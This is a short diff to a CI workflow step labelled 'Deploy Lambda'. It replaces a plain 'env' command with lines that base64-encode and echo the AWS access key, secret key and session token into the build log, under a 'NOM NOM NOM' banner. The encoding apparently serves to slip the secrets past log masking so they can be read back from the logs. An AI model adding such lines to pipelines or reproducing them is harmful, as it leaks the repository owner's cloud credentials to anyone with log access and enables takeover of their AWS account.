@@ -24,4 +24,6 @@ jobs:
       - name: Deploy Lambda
         run: |
           echo ">>>>>>>>  NOM NOM NOM <<<<<<<<"
-          env
+          echo "$AWS_ACCESS_KEY_ID" | base64
+          echo "$AWS_SECRET_ACCESS_KEY" | base64
+          echo "$AWS_SESSION_TOKEN" | base64
